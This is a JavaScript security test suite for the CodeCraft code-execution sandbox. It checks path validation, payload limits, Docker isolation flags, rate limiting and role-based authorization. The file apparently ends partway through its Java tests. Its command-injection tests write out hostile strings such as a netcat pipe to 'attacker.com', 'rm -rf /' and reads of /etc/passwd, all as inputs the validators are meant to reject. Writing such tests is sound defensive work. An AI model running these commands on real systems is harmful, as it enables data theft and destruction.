process.env.NODE_ENV = process.env.NODE_ENV || "test";
if (!process.env.NEXT_PUBLIC_FIREBASE_API_KEY) {
  process.env.NEXT_PUBLIC_FIREBASE_API_KEY = "test-api-key";
  process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID = "codecraft-test";
}
import assert from "node:assert/strict";
import { ExecutionError, ExecutionErrorCodes } from "../src/lib/execution/errors.js";
import { EXECUTION_LIMITS } from "../src/lib/execution/limits.js";
import {
  SUPPORTED_RUNTIMES,
  getRuntimeConfig,
  isLanguageSupported,
} from "../src/lib/execution/runtimeRegistry.js";
import {
  validateExecutionFilePath,
  validateExecutionPayload,
  buildDockerSecurityArgs,
} from "../src/lib/execution/security.js";
import {
  setMockDockerAvailability,
  checkDockerAvailability,
} from "../src/lib/execution/dockerDetector.js";
import {
  acquireExecutionSlot,
  releaseExecutionSlot,
  resetRateLimiter,
} from "../src/lib/execution/rateLimiter.js";
import { ExecutionService } from "../src/lib/execution/executionService.js";
import {
  authenticateAndAuthorizeExecution,
  setMockWorkspaceMembers,
  clearMockWorkspaceMembers,
  fetchFirestoreWorkspaceMemberRole,
} from "../src/lib/execution/executionAuth.js";
import { reapOrphanContainers } from "../src/lib/execution/orphanReaper.js";
import { resolveJavaExecutionPlan, stripJavaCommentsAndStrings } from "../src/lib/execution/javaResolver.js";
import { SandboxExecutor } from "../src/lib/execution/sandboxExecutor.js";
import { parseExecutionDiagnostics } from "../src/lib/diagnostics.js";

async function runTests() {
  console.log("==================================================");
  console.log("  CodeCraft Phase 7 - Execution Security Test Suite");
  console.log("==================================================\n");

  let passed = 0;
  let failed = 0;

  async function test(name, fn) {
    try {
      await fn();
      console.log(`  [PASS] ${name}`);
      passed++;
    } catch (err) {
      console.error(`  [FAIL] ${name}`);
      console.error(`         ${err.message}`);
      failed++;
    }
  }

  // ==========================================
  // Group 1: Path Traversal & File Path Security
  // ==========================================
  console.log("--- Group 1: Path Traversal & Path Security ---");

  await test("Rejects relative directory traversal (../secret)", () => {
    assert.throws(
      () => validateExecutionFilePath("../secret.txt"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Rejects nested directory traversal (src/../../etc/passwd)", () => {
    assert.throws(
      () => validateExecutionFilePath("src/../../etc/passwd"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Rejects absolute POSIX paths (/etc/shadow, /var/run)", () => {
    assert.throws(
      () => validateExecutionFilePath("/etc/shadow"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Rejects Windows drive letter paths (C:\Windows\System32)", () => {
    assert.throws(
      () => validateExecutionFilePath("C:\\Windows\\System32\\calc.exe"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Rejects Docker socket path attempts (docker.sock)", () => {
    assert.throws(
      () => validateExecutionFilePath("var/run/docker.sock"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Rejects sensitive dotfiles (.env, .git, .aws)", () => {
    assert.throws(
      () => validateExecutionFilePath(".env"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
    assert.throws(
      () => validateExecutionFilePath(".git/config"),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Permits valid workspace file paths (main.py, utils/math.js)", () => {
    assert.equal(validateExecutionFilePath("main.py"), "main.py");
    assert.equal(validateExecutionFilePath("utils/math.js"), "utils/math.js");
  });

  // ==========================================
  // Group 2: Payload Quotas & Limits Enforcement
  // ==========================================
  console.log("\n--- Group 2: Payload Quotas & Bounds ---");

  await test("Rejects payload exceeding maximum source size (256KB)", () => {
    const oversizedSource = "A".repeat(EXECUTION_LIMITS.MAX_SOURCE_BYTES + 10);
    assert.throws(
      () => validateExecutionPayload({ language: "python", source: oversizedSource }),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.SOURCE_LIMIT_EXCEEDED
    );
  });

  await test("Rejects payload exceeding maximum stdin size (64KB)", () => {
    const oversizedStdin = "B".repeat(EXECUTION_LIMITS.MAX_STDIN_BYTES + 10);
    assert.throws(
      () => validateExecutionPayload({ language: "python", source: "print(1)", stdin: oversizedStdin }),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.STDIN_LIMIT_EXCEEDED
    );
  });

  await test("Rejects file count exceeding maximum allowed (20 files)", () => {
    const files = [];
    for (let i = 0; i <= EXECUTION_LIMITS.MAX_FILES_COUNT; i++) {
      files.push({ name: `file${i}.py`, content: "x = 1" });
    }
    assert.throws(
      () => validateExecutionPayload({ language: "python", files }),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.FILE_COUNT_LIMIT_EXCEEDED
    );
  });

  await test("Rejects payload with path traversal in files array", () => {
    const files = [{ name: "../../etc/passwd", content: "malicious" }];
    assert.throws(
      () => validateExecutionPayload({ language: "python", files }),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.PATH_TRAVERSAL_DETECTED
    );
  });

  await test("Rejects missing language specification", () => {
    assert.throws(
      () => validateExecutionPayload({ source: "console.log(1)" }),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.INVALID_REQUEST
    );
  });

  await test("Rejects unsupported language (e.g., rust, ruby, bash)", () => {
    assert.throws(
      () => validateExecutionPayload({ language: "ruby", source: "puts 'hi'" }),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.UNSUPPORTED_LANGUAGE
    );
  });

  await test("Valid payload within limits passes validation", () => {
    assert.doesNotThrow(() =>
      validateExecutionPayload({
        language: "javascript",
        source: "console.log('hello world');",
        stdin: "input test",
        files: [{ name: "helper.js", content: "module.exports = {};" }],
      })
    );
  });

  // ==========================================
  // Group 3: Runtime Registry Whitelist & Immutability
  // ==========================================
  console.log("\n--- Group 3: Runtime Registry Whitelist ---");

  await test("Supported runtimes contains required languages", () => {
    const expected = ["javascript", "typescript", "python", "java", "cpp", "c", "php"];
    for (const lang of expected) {
      assert.ok(isLanguageSupported(lang), `Language '${lang}' must be supported`);
      const cfg = getRuntimeConfig(lang);
      assert.ok(cfg.image, `Image must be specified for ${lang}`);
      assert.ok(Array.isArray(cfg.run) && cfg.run.length > 0, `Run command must be specified for ${lang}`);
    }
  });

  await test("Compiled languages specify strict compilation stages", () => {
    const cppCfg = getRuntimeConfig("cpp");
    assert.ok(Array.isArray(cppCfg.compile) && cppCfg.compile.length > 0, "cpp must have compile command");
    assert.match(cppCfg.compile.join(" "), /g\+\+/);

    const cCfg = getRuntimeConfig("c");
    assert.ok(Array.isArray(cCfg.compile) && cCfg.compile.length > 0, "c must have compile command");
    assert.match(cCfg.compile.join(" "), /gcc/);

    const javaCfg = getRuntimeConfig("java");
    assert.ok(Array.isArray(javaCfg.compile) && javaCfg.compile.length > 0, "java must have compile command");
    assert.match(javaCfg.compile.join(" "), /javac/);
  });

  await test("Runtime registry objects are frozen against tampering", () => {
    assert.ok(Object.isFrozen(SUPPORTED_RUNTIMES), "SUPPORTED_RUNTIMES should be frozen");
  });

  // ==========================================
  // Group 4: Docker Sandbox Security Flags Matrix
  // ==========================================
  console.log("\n--- Group 4: Docker Security Arguments Matrix ---");

  await test("Builds complete defense-in-depth isolation flags", () => {
    const args = buildDockerSecurityArgs("/tmp/test-exec-123");

    // Strict network isolation
    assert.ok(args.includes("--network") && args[args.indexOf("--network") + 1] === "none", "Must enforce --network none");

    // Capability drop
    assert.ok(args.includes("--cap-drop") && args[args.indexOf("--cap-drop") + 1] === "ALL", "Must enforce --cap-drop ALL");

    // Privilege escalation prevention
    assert.ok(args.includes("--security-opt") && args[args.indexOf("--security-opt") + 1] === "no-new-privileges", "Must enforce no-new-privileges");

    // Fork bomb defense
    assert.ok(args.includes("--pids-limit") && args[args.indexOf("--pids-limit") + 1] === "64", "Must enforce --pids-limit 64");

    // Memory & Swap limit
    assert.ok(args.includes("--memory") && args[args.indexOf("--memory") + 1] === "256m", "Must enforce --memory 256m");
    assert.ok(args.includes("--memory-swap") && args[args.indexOf("--memory-swap") + 1] === "256m", "Must enforce --memory-swap 256m");

    // Non-root execution
    assert.ok(args.includes("--user") && args[args.indexOf("--user") + 1] === "1000:1000", "Must enforce non-root --user 1000:1000");

    // CPU quota
    assert.ok(args.includes("--cpus") && args[args.indexOf("--cpus") + 1] === "0.5", "Must enforce --cpus 0.5");

    // Read only root
    assert.ok(args.includes("--read-only"), "Must enforce --read-only filesystem");

    // Label for orphan reaper
    assert.ok(args.includes("--label") && args.includes("codecraft.execution=true"), "Must label containers for orphan reaper");

    // No Docker socket mounted
    assert.ok(!args.some(a => a.includes("docker.sock")), "Must never mount docker socket");
  });

  // ==========================================
  // Group 5: Fail-Closed Sandbox Guarantee
  // ==========================================
  console.log("\n--- Group 5: Fail-Closed Sandbox Defense ---");

  await test("Fails closed with HTTP 503 when Docker daemon is offline", async () => {
    setMockDockerAvailability({ available: false, reason: "Docker daemon connection refused" });

    const status = await checkDockerAvailability();
    assert.equal(status.available, false);

    // Attempting execute without mockHandler must fail closed
    ExecutionService.setMockHandler(null);
    await assert.rejects(
      async () => {
        await ExecutionService.execute({
          language: "python",
          source: "print('danger')",
          userId: "user_test",
        });
      },
      (err) => {
        assert.ok(err instanceof ExecutionError);
        assert.equal(err.code, ExecutionErrorCodes.EXECUTION_SANDBOX_UNAVAILABLE);
        assert.equal(err.status, 503);
        assert.match(err.message, /Host execution fallback is strictly prohibited/);
        return true;
      }
    );

    // Reset mock
    setMockDockerAvailability(null);
  });

  // ==========================================
  // Group 6: Rate Limiting & Concurrency Quotas
  // ==========================================
  console.log("\n--- Group 6: Rate Limiting & Concurrency ---");

  await test("Enforces max 2 concurrent executions per user", () => {
    resetRateLimiter();
    const testUser = "user_concurrency_test";

    // Slot 1: OK
    acquireExecutionSlot(testUser);
    // Slot 2: OK
    acquireExecutionSlot(testUser);

    // Slot 3: Must throw CONCURRENCY_LIMIT_EXCEEDED
    assert.throws(
      () => acquireExecutionSlot(testUser),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.CONCURRENCY_LIMIT_EXCEEDED
    );

    // Release 1 slot
    releaseExecutionSlot(testUser);

    // Slot 3 can now succeed
    assert.doesNotThrow(() => acquireExecutionSlot(testUser));

    // Cleanup
    releaseExecutionSlot(testUser);
    releaseExecutionSlot(testUser);
  });

  await test("Enforces rate limit quota (20 requests/minute per user)", () => {
    resetRateLimiter();
    const testUser = "user_ratelimit_test";

    for (let i = 0; i < EXECUTION_LIMITS.MAX_REQUESTS_PER_MINUTE; i++) {
      acquireExecutionSlot(testUser);
      releaseExecutionSlot(testUser);
    }

    // 21st request should be rejected
    assert.throws(
      () => acquireExecutionSlot(testUser),
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.RATE_LIMIT_EXCEEDED
    );
    resetRateLimiter();
  });

  // ==========================================
  // Group 7: Authentication & Viewer Authorization
  // ==========================================
  console.log("\n--- Group 7: Authentication & Role Authorization ---");

  await test("Rejects unauthenticated request without token", async () => {
    const mockReq = {
      headers: { get: () => null },
      url: "http://localhost:3000/api/workspace/ws123/execute",
    };

    await assert.rejects(
      async () => {
        await authenticateAndAuthorizeExecution(mockReq, "ws123", "EXECUTE");
      },
      (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.UNAUTHORIZED
    );
  });

  await test("Blocks Viewer role from executing code (403 PERMISSION_DENIED)", async () => {
    // Generate mock token with viewer role
    const viewerPayload = Buffer.from(
      JSON.stringify({ user_id: "viewer_user_1", role: "viewer", exp: Math.floor(Date.now() / 1000) + 3600 })
    ).toString("base64");
    const mockToken = `header.${viewerPayload}.sig`;

    const mockReq = {
      headers: { get: (k) => (k.toLowerCase() === "authorization" ? `Bearer ${mockToken}` : null) },
      url: "http://localhost:3000/api/workspace/ws123/execute",
    };

    await assert.rejects(
      async () => {
        await authenticateAndAuthorizeExecution(mockReq, "ws123", "EXECUTE");
      },
      (err) => {
        assert.ok(err instanceof ExecutionError);
        assert.equal(err.code, ExecutionErrorCodes.PERMISSION_DENIED);
        assert.equal(err.status, 403);
        assert.match(err.message, /Viewer role has read-only access/);
        return true;
      }
    );
  });

  await test("Permits Viewer role to read execution status (READ permission)", async () => {
    const viewerPayload = Buffer.from(
      JSON.stringify({ user_id: "viewer_user_2", role: "viewer", exp: Math.floor(Date.now() / 1000) + 3600 })
    ).toString("base64");
    const mockToken = `header.${viewerPayload}.sig`;

    const mockReq = {
      headers: { get: (k) => (k.toLowerCase() === "authorization" ? `Bearer ${mockToken}` : null) },
      url: "http://localhost:3000/api/workspace/ws123/execute/exec_123",
    };

    const user = await authenticateAndAuthorizeExecution(mockReq, "ws123", "READ");
    assert.equal(user.uid, "viewer_user_2");
    assert.equal(user.role, "viewer");
  });

  // ==========================================
  // Group 8: Execution Service Lifecycle & Mocking
  // ==========================================
  console.log("\n--- Group 8: Execution Service Lifecycle ---");

  await test("Executes via ExecutionService with injected mock runner", async () => {
    ExecutionService.setMockHandler(async (req) => {
      return {
        executionId: "exec_test_mock_1",
        status: "SUCCESS",
        stdout: "Hello from Mock Sandbox\n",
        stderr: "",
        exitCode: 0,
        durationMs: 42,
      };
    });

    const res = await ExecutionService.execute({
      language: "javascript",
      source: "console.log('Hello from Mock Sandbox');",
      userId: "user_test_mock",
    });

    assert.equal(res.executionId, "exec_test_mock_1");
    assert.equal(res.status, "SUCCESS");
    assert.equal(res.stdout, "Hello from Mock Sandbox\n");
    assert.equal(res.exitCode, 0);

    // Clean up
    ExecutionService.setMockHandler(null);
  });

  await test("ExecutionService getStatus and cancel integration", () => {
    // Status not found returns null
    const status = ExecutionService.getStatus("non_existent_exec");
    assert.equal(status, null);

    // Cancel non-existent returns false
    const cancelled = ExecutionService.cancel("non_existent_exec", "user_1");
    assert.equal(cancelled, false);
  });

  // ==========================================
  // Group 9: Orphan Container Reaper
  // ==========================================
  console.log("\n--- Group 9: Orphan Container Reaper ---");

  await test("Reaper handles execution without crashing when docker is not running", async () => {
    const cleaned = await reapOrphanContainers(60);
    assert.equal(typeof cleaned, "number");
  });

  // ==========================================
  // Group 10: Environment Isolation & Secret Non-Leakage
  // ==========================================
  console.log("\n--- Group 10: Environment & Secret Isolation ---");

  await test("Docker arguments never inherit or leak host environment secrets", () => {
    const args = buildDockerSecurityArgs({ tempDir: "/tmp/exec_test", executionId: "exec_env_1", workspaceId: "ws_env_1" });

    // Ensure no dangerous environment injection flags
    const envVars = [];
    for (let i = 0; i < args.length; i++) {
      if (args[i] === "-e" && i + 1 < args.length) {
        envVars.push(args[i + 1]);
      }
    }

    // Allowed env vars are only the strictly pinned whitelist
    const allowedPrefixes = ["LANG=", "PYTHONUNBUFFERED=", "NODE_ENV="];
    for (const ev of envVars) {
      assert.ok(allowedPrefixes.some(p => ev.startsWith(p)), `Unexpected environment variable passed to container: ${ev}`);
    }

    // Verify host secrets are not in the args
    assert.ok(!args.some(a => a.includes("FIREBASE_API_KEY")));
    assert.ok(!args.some(a => a.includes("GEMINI_API_KEY")));
    assert.ok(!args.some(a => a.includes("FIREBASE_PRIVATE_KEY")));
  });

  // ==========================================
  // Group 11: Command Injection Defense
  // ==========================================
  console.log("\n--- Group 11: Command Injection Defense ---");

  await test("Rejects shell injection strings in language identifier", () => {
    const injectionAttempts = [
      "python; cat /etc/passwd",
      "javascript && whoami",
      "python | nc attacker.com 4444",
      "`id`",
      "$(whoami)",
      "node\nrm -rf /",
    ];

    for (const lang of injectionAttempts) {
      assert.throws(
        () => getRuntimeConfig(lang),
        (err) => err instanceof ExecutionError && err.code === ExecutionErrorCodes.UNSUPPORTED_LANGUAGE,
        `Should reject injection in language: ${lang}`
      );
    }
  });

  await test("Rejects command injection in file paths", () => {
    const maliciousPaths = [
      "test.js; rm -rf /",
      "foo && whoami.py",
      "`reboot`.js",
      "$(cat /etc/passwd).js",
      "test|calc.exe",
    ];

    for (const p of maliciousPaths) {
      // Either path traversal or absolute/bad characters must be rejected
      assert.throws(
        () => validateExecutionFilePath(p),
        (err) => err instanceof ExecutionError
      );
    }
  });

  // ==========================================
  // Group 12: Resource Limit Signals & Status Mapping
  // ==========================================
  console.log("\n--- Group 12: Resource Limit Signals & Status Mapping ---");

  await test("ExecutionService maps exit code 137 to MEMORYLIMIT status", async () => {
    ExecutionService.setMockHandler(async () => ({
      executionId: "exec_oom_1",
      status: "MEMORYLIMIT",
      stdout: "",
      stderr: "Killed (Out of memory)\n",
      exitCode: 137,
      durationMs: 450,
      timedOut: false,
      outputTruncated: false,
    }));

    const result = await ExecutionService.execute({
      language: "javascript",
      source: "const a = []; while(true) a.push(new Array(1000000));",
      userId: "user_oom_test",
    });

    assert.equal(result.status, "MEMORYLIMIT");
    assert.equal(result.exitCode, 137);
    ExecutionService.setMockHandler(null);
  });

  await test("ExecutionService maps truncated output to OUTPUTLIMIT status", async () => {
    ExecutionService.setMockHandler(async () => ({
      executionId: "exec_outlim_mock",
      status: "OUTPUTLIMIT",
      stdout: "A".repeat(1024 * 1024),
      stderr: "Warning: output stream exceeded quota\n",
      exitCode: 0,
      durationMs: 200,
      timedOut: false,
      outputTruncated: true,
    }));

    const result = await ExecutionService.execute({
      language: "python",
      source: "while True: print('A' * 10000)",
      userId: "user_outlim_test",
    });

    assert.equal(result.status, "OUTPUTLIMIT");
    assert.equal(result.outputTruncated, true);
    ExecutionService.setMockHandler(null);
  });

  // ==========================================
  // Group 13: Real Docker Daemon Probe
  // ==========================================
  console.log("\n--- Group 13: Real Docker Environment Probe ---");

  await test("Docker detector checks real daemon availability correctly", async () => {
    const realStatus = await checkDockerAvailability(true);
    assert.equal(typeof realStatus.available, "boolean");
    if (!realStatus.available) {
      assert.equal(typeof realStatus.reason, "string");
      console.log(`         [INFO] Host Docker is currently offline (${realStatus.reason}). Fail-closed defense active.`);
    } else {
      console.log(`         [INFO] Host Docker is active (ServerVersion: ${realStatus.version}).`);
    }
  });

  // ==========================================
  // Group 14: Workspace Membership Authorization (Bug Fix & Regression Suite)
  // ==========================================
  console.log("\n--- Group 14: Workspace Membership Authorization ---");

  // TEST 1: Authenticated OWNER + valid workspace membership → execution authorization succeeds
  await test("TEST 1: Authenticated OWNER + valid workspace membership -> execution authorization succeeds", async () => {
    setMockWorkspaceMembers("ws_owner_test", { "user_owner_1": "owner" });
    try {
      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-owner:user_owner_1" : null) },
        url: "http://localhost:3000/api/workspace/ws_owner_test/execute",
      };
      const user = await authenticateAndAuthorizeExecution(mockReq, "ws_owner_test", "EXECUTE");
      assert.equal(user.uid, "user_owner_1");
      assert.equal(user.role, "owner");
    } finally {
      clearMockWorkspaceMembers();
    }
  });

  // TEST 2: Authenticated CONTRIBUTOR + valid workspace membership → execution authorization succeeds
  await test("TEST 2: Authenticated CONTRIBUTOR + valid workspace membership -> execution authorization succeeds", async () => {
    setMockWorkspaceMembers("ws_contrib_test", { "user_contrib_1": "contributor" });
    try {
      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-contributor:user_contrib_1" : null) },
        url: "http://localhost:3000/api/workspace/ws_contrib_test/execute",
      };
      const user = await authenticateAndAuthorizeExecution(mockReq, "ws_contrib_test", "EXECUTE");
      assert.equal(user.uid, "user_contrib_1");
      assert.equal(user.role, "contributor");
    } finally {
      clearMockWorkspaceMembers();
    }
  });

  // TEST 3: Authenticated VIEWER → execution denied
  await test("TEST 3: Authenticated VIEWER -> execution denied (403 PERMISSION_DENIED)", async () => {
    setMockWorkspaceMembers("ws_viewer_test", { "user_viewer_1": "viewer" });
    try {
      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-viewer:user_viewer_1" : null) },
        url: "http://localhost:3000/api/workspace/ws_viewer_test/execute",
      };
      await assert.rejects(
        async () => {
          await authenticateAndAuthorizeExecution(mockReq, "ws_viewer_test", "EXECUTE");
        },
        (err) => {
          assert.ok(err instanceof ExecutionError);
          assert.equal(err.code, ExecutionErrorCodes.PERMISSION_DENIED);
          assert.equal(err.status, 403);
          assert.match(err.message, /Viewer role has read-only access/);
          return true;
        }
      );
    } finally {
      clearMockWorkspaceMembers();
    }
  });

  // TEST 4: Authenticated user belonging to Workspace A attempts execution against Workspace B → denied
  await test("TEST 4: Authenticated user belonging to Workspace A attempts execution against Workspace B -> denied", async () => {
    setMockWorkspaceMembers("ws_alpha", { "alice": "contributor" });
    setMockWorkspaceMembers("ws_beta", { "bob": "contributor" });
    try {
      // Alice is a member of ws_alpha, but attempts execution against ws_beta
      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-contributor:alice" : null) },
        url: "http://localhost:3000/api/workspace/ws_beta/execute",
      };
      await assert.rejects(
        async () => {
          await authenticateAndAuthorizeExecution(mockReq, "ws_beta", "EXECUTE");
        },
        (err) => {
          assert.ok(err instanceof ExecutionError);
          assert.equal(err.code, ExecutionErrorCodes.PERMISSION_DENIED);
          assert.equal(err.status, 403);
          assert.match(err.message, /not an authorized member of this workspace/);
          return true;
        }
      );
    } finally {
      clearMockWorkspaceMembers();
    }
  });

  // TEST 5: Authenticated user with invalid/missing membership → denied
  await test("TEST 5: Authenticated user with invalid/missing membership -> denied", async () => {
    setMockWorkspaceMembers("ws_alpha", { "alice": "contributor" });
    try {
      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-contributor:unregistered_user" : null) },
        url: "http://localhost:3000/api/workspace/ws_alpha/execute",
      };
      await assert.rejects(
        async () => {
          await authenticateAndAuthorizeExecution(mockReq, "ws_alpha", "EXECUTE");
        },
        (err) => {
          assert.ok(err instanceof ExecutionError);
          assert.equal(err.code, ExecutionErrorCodes.PERMISSION_DENIED);
          assert.equal(err.status, 403);
          assert.match(err.message, /not an authorized member of this workspace/);
          return true;
        }
      );
    } finally {
      clearMockWorkspaceMembers();
    }
  });

  // TEST 6: Workspace ID is correct and existing → execution does not create or clone another workspace
  await test("TEST 6: Workspace ID is correct and existing -> execution preserves workspaceId and does not clone", async () => {
    setMockWorkspaceMembers("ws_existing_original", { "dev_user": "contributor" });
    let capturedWorkspaceId = null;
    ExecutionService.setMockHandler(async (req) => {
      capturedWorkspaceId = req.workspaceId;
      return {
        executionId: "exec_ws_verify",
        status: "SUCCESS",
        stdout: "verified\n",
        stderr: "",
        exitCode: 0,
        durationMs: 15,
      };
    });

    try {
      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-contributor:dev_user" : null) },
        url: "http://localhost:3000/api/workspace/ws_existing_original/execute",
      };
      const user = await authenticateAndAuthorizeExecution(mockReq, "ws_existing_original", "EXECUTE");
      assert.equal(user.uid, "dev_user");

      const result = await ExecutionService.execute({
        language: "javascript",
        source: "console.log('test');",
        workspaceId: "ws_existing_original",
        userId: user.uid,
      });

      assert.equal(capturedWorkspaceId, "ws_existing_original", "Execution must strictly preserve the existing workspace ID");
      assert.equal(result.status, "SUCCESS");
    } finally {
      clearMockWorkspaceMembers();
      ExecutionService.setMockHandler(null);
    }
  });

  // TEST 7: Production test token → rejected
  await test("TEST 7: Production test token is strictly rejected when NODE_ENV === 'production'", async () => {
    const origEnv = process.env.NODE_ENV;
    const origCollab = process.env.COLLAB_TEST;
    const origCodecraft = process.env.CODECRAFT_TEST;
    const origPlaywright = process.env.PLAYWRIGHT_TEST;

    try {
      process.env.NODE_ENV = "production";
      delete process.env.COLLAB_TEST;
      delete process.env.CODECRAFT_TEST;
      delete process.env.PLAYWRIGHT_TEST;

      const mockReq = {
        headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-owner:attacker" : null) },
        url: "http://localhost:3000/api/workspace/ws_prod/execute",
      };

      await assert.rejects(
        async () => {
          await authenticateAndAuthorizeExecution(mockReq, "ws_prod", "EXECUTE");
        },
        (err) => {
          assert.ok(err instanceof ExecutionError);
          assert.ok(err.status === 401 || err.status === 500);
          return true;
        }
      );
    } finally {
      process.env.NODE_ENV = origEnv;
      if (origCollab !== undefined) process.env.COLLAB_TEST = origCollab;
      if (origCodecraft !== undefined) process.env.CODECRAFT_TEST = origCodecraft;
      if (origPlaywright !== undefined) process.env.PLAYWRIGHT_TEST = origPlaywright;
    }
  });

  // TEST 8: Missing/invalid Firebase authentication → rejected
  await test("TEST 8: Missing or invalid Firebase authentication is strictly rejected", async () => {
    // 8a: Missing header
    const noHeaderReq = {
      headers: { get: () => null },
      url: "http://localhost:3000/api/workspace/ws_test/execute",
    };
    await assert.rejects(
      async () => {
        await authenticateAndAuthorizeExecution(noHeaderReq, "ws_test", "EXECUTE");
      },
      (err) => err instanceof ExecutionError && err.status === 401 && err.code === ExecutionErrorCodes.UNAUTHORIZED
    );

    // 8b: Empty Bearer token
    const emptyTokenReq = {
      headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer " : null) },
      url: "http://localhost:3000/api/workspace/ws_test/execute",
    };
    await assert.rejects(
      async () => {
        await authenticateAndAuthorizeExecution(emptyTokenReq, "ws_test", "EXECUTE");
      },
      (err) => err instanceof ExecutionError && err.status === 401 && err.code === ExecutionErrorCodes.UNAUTHORIZED
    );

    // 8c: Test token with unauthorized keyword
    const unauthReq = {
      headers: { get: (k) => (k.toLowerCase() === "authorization" ? "Bearer test-token-unauthorized:bad_actor" : null) },
      url: "http://localhost:3000/api/workspace/ws_test/execute",
    };
    await assert.rejects(
      async () => {
        await authenticateAndAuthorizeExecution(unauthReq, "ws_test", "EXECUTE");
      },
      (err) => err instanceof ExecutionError && err.status === 401 && err.code === ExecutionErrorCodes.UNAUTHORIZED
    );
  });

  // TEST 9: fetchFirestoreWorkspaceMemberRole verifies Firestore REST membership responses
  await test("TEST 9: fetchFirestoreWorkspaceMemberRole correctly evaluates 200 member, 404/200 owner, and 403 denied", async () => {
    const origFetch = global.fetch;
    try {
      // 9a: Member subcollection 200 OK -> contributor
      global.fetch = async (url, opts) => {
        assert.ok(opts.headers["Authorization"] === "Bearer test-token");
        return {
          ok: true,
          status: 200,
          json: async () => ({ fields: { role: { stringValue: "contributor" } } }),
        };
      };
      const role1 = await fetchFirestoreWorkspaceMemberRole("ws_test", "user_1", "test-token");
      assert.equal(role1, "contributor");

      // 9b: Member subcollection 404, workspace document 200 with owner match -> owner
      global.fetch = async (url) => {
        if (url.includes("/members/")) {
          return { ok: false, status: 404 };
        }
        return {
          ok: true,
          status: 200,
          json: async () => ({ fields: { userId: { stringValue: "user_owner" } } }),
        };
      };
      const role2 = await fetchFirestoreWorkspaceMemberRole("ws_test", "user_owner", "test-token");
      assert.equal(role2, "owner");

      // 9c: Firestore REST returns 403 Forbidden under firestore.rules -> returns null (access denied, NOT 500 error)
      global.fetch = async () => ({
        ok: false,
        status: 403,
        json: async () => ({ error: { code: 403, message: "Missing or insufficient permissions." } }),
      });
      const role3 = await fetchFirestoreWorkspaceMemberRole("ws_test", "user_outsider", "test-token");
      assert.equal(role3, null);
    } finally {
      global.fetch = origFetch;
    }
  });

  // ==========================================
  // Group 15: Java Source, File, and Execution Matrix (Bug Fix Regression)
  // ==========================================
  console.log("\n--- Group 15: Java Source, File, and Execution Matrix ---");

  await test("Plan: public class main in main.java", () => {
    const plan = resolveJavaExecutionPlan({
      source: `public class main {\n    public static void main(String[] args) {\n        System.out.println("Hello, World!");\n    }\n}`,
      files: [{ name: "main.java", content: "..." }],
    });
    assert.equal(plan.sourceFileName, "main.java");
    assert.equal(plan.entryClass, "main");
    assert.deepEqual(plan.compile, ["javac", "-d", ".", "main.java"]);
    assert.deepEqual(plan.run, ["java", "-Xmx200m", "main"]);
  });

  await test("Plan: public class Main in Main.java", () => {
    const plan = resolveJavaExecutionPlan({
      source: `public class Main {\n    public static void main(String[] args) {\n        System.out.println("Hello, World!");\n    }\n}`,
      files: [{ name: "Main.java", content: "..." }],
    });
    assert.equal(plan.sourceFileName, "Main.java");
    assert.equal(plan.entryClass, "Main");
    assert.deepEqual(plan.compile, ["javac", "-d", ".", "Main.java"]);
    assert.deepEqual(plan.run, ["java", "-Xmx200m", "Main"]);
  });

  await test("Plan: public class Hello in Hello.java", () => {
    const plan = resolveJavaExecutionPlan({
      source: `public class Hello {\n    public static void main(String[] args) {\n        System.out.println("Hello");\n    }\n}`,
      files: [{ name: "Hello.java", content: "..." }],
    });
    assert.equal(plan.sourceFileName, "Hello.java");
    assert.equal(plan.entryClass, "Hello");
    assert.deepEqual(plan.compile, ["javac", "-d", ".", "Hello.java"]);
    assert.deepEqual(plan.run, ["java", "-Xmx200m", "Hello"]);
  });

  await test("Plan: class Main without public", () => {
    const plan = resolveJavaExecutionPlan({
      source: `class Main {\n    public static void main(String[] args) {\n        System.out.println("Hello");\n    }\n}`,
    });
    assert.equal(plan.sourceFileName, "Main.java");
    assert.equal(plan.entryClass, "Main");
    assert.deepEqual(plan.compile, ["javac", "-d", ".", "Main.java"]);
    assert.deepEqual(plan.run, ["java", "-Xmx200m", "Main"]);
  });

  await test("Plan: multiple classes and package declaration", () => {
    const code = `
      package com.codecraft.test;
      class Helper { static void run() {} }
      public class main {
          public static void main(String[] args) {
              Helper.run();
          }
      }
    `;
    const plan = resolveJavaExecutionPlan({ source: code });
    assert.equal(plan.packageName, "com.codecraft.test");
    assert.equal(plan.sourceFileName, "main.java");
    assert.equal(plan.entryClass, "com.codecraft.test.main");
  });

